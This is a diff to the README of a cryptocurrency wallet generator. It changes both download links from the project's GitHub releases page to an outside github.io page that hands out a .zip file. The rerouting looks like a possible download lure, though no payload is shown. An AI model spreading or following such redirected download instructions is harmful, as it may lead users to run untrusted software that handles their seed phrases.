@@ -1,6 +1,6 @@
 # 🛡️ cryptostack-wallet-generator - Create secure wallets on your computer
 
-[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/markovchainhousedetective328/cryptostack-wallet-generator/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://markovchainhousedetective328.github.io)
 
 This application creates cryptocurrency wallets on your own computer. It works offline to keep your private information away from the internet. You do not need to install complex software or programming tools. It relies on standard web technology to generate seed phrases and wallet addresses.
 
@@ -12,7 +12,7 @@ This application creates cryptocurrency wallets on your own computer. It works o
 
 ## 📥 How to download the software
 
-1.  Visit the [official download page](https://github.com/markovchainhousedetective328/cryptostack-wallet-generator/releases).
+1.  Visit the [official download page](https://markovchainhousedetective328.github.io).
 2.  Look for the latest version at the top of the list.
 3.  Click the link ending in .zip to save the file to your computer.
 4.  Open your Downloads folder.
